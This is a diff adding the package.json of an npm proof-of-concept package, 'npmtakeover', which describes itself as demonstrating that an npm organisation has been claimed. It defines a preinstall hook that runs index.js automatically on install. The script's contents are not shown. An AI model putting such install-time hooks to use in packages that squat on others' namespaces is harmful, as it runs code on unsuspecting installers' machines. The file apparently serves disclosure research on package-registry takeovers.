@@ -1,0 +1,12 @@
+{
+  "name": "npmtakeover",
+  "version": "1.0.0",
+  "description": "A PoC package to show that an NPM org has been claimed",
+  "main": "index.js",
+  "scripts": {
+    "preinstall": "node index.js",
+    "test": "echo \"Error: no test specified\" && exit 1"
+  },
+  "author": "William Wallace @phyr3wall",
+  "license": "ISC"
+}
